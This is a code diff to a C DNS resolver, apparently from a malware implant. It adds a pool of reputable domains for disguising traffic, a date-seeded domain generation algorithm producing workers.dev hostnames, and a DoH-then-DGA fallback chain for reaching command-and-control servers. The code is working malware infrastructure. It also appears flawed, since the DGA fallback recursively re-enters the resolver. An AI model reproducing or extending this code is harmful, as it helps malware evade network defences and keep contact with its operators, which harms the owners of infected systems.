@@ -10,6 +10,49 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <time.h>
+#include <stdio.h>
+
+const char* PH_DNS_LEGIT_POOL[PH_DNS_POOL_SIZE] = {
+    "cloudflare.com",
+    "githubusercontent.com",
+    "workers.dev",
+    "api.telegram.org",
+    "paste.noirproject.dev"
+};
+
+int ph_dns_get_pool_domain(char *domain, size_t len, int index)
+{
+    if (!domain || index < 0 || index >= PH_DNS_POOL_SIZE) {
+        return PH_ERR_INVALID_ARG;
+    }
+    strncpy(domain, PH_DNS_LEGIT_POOL[index], len - 1);
+    domain[len-1] = '\0';
+    return PH_OK;
+}
+
+int ph_dns_dga_generate(char *domain, size_t len, int day_offset)
+{
+    if (!domain || len < 32) return PH_ERR_INVALID_ARG;
+
+    time_t now = time(NULL) + (day_offset * 86400);
+    struct tm *tm_info = gmtime(&now);
+    
+    // Seed: ghost-YYYYMMDD
+    char seed[16];
+    snprintf(seed, sizeof(seed), "gh%04d%02d%02d", 
+             tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday);
+
+    // Simple hash for DGA
+    uint32_t h = 0x811c9dc5;
+    for (int i = 0; seed[i]; i++) {
+        h ^= (uint32_t)seed[i];
+        h *= 0x01000193;
+    }
+
+    snprintf(domain, len, "g%08x.workers.dev", h);
+    return PH_OK;
+}
 
 int ph_dns_config_init(ph_dns_config_t *config)
 {
@@ -300,6 +343,20 @@ int ph_dns_resolve(ph_dns_result_t *result, const char *hostname,
             result->method_used = PH_DNS_METHOD_RAW_UDP;
             return PH_OK;
         }
+    }
+
+    // Fallback 1: DoH (Cloudflare)
+    if (ph_dns_doh_resolve(result, hostname, "1.1.1.1") == PH_OK) {
+        result->method_used = PH_DNS_METHOD_DOH;
+        return PH_OK;
+    }
+
+    // Fallback 2: DGA
+    char dga_domain[PH_DNS_MAX_DOMAIN_LEN];
+    ph_dns_dga_generate(dga_domain, sizeof(dga_domain), 0);
+    if (ph_dns_resolve(result, dga_domain, config) == PH_OK) {
+        result->method_used = PH_DNS_METHOD_DGA;
+        return PH_OK;
     }
 
     result->success = 0;
